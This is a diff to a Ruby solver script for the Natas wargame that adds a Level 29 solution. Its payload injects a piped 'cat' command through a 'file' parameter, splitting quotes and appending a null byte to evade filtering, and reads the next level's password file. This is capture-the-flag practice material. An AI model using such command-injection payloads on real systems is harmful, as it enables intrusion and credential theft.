@@ -843,4 +843,18 @@ end
 # Level 29
 class NatasLevel29 < NatasLevelBase
   LEVEL = 29
+  PAGE = '/'
+  PAYLOAD = %(| cat '/etc/n''atas''_webpass/n''atas30' \x00)
+
+  def exec
+    data = get("#{PAGE}?file=#{URI.encode_www_form_component(PAYLOAD)}").body
+    match = %r(</html>\n(\w{32})).match(data)
+    not_found unless match
+    found(match[1])
+  end
+end
+
+# Level 30
+class NatasLevel30 < NatasLevelBase
+  LEVEL = 30
 end
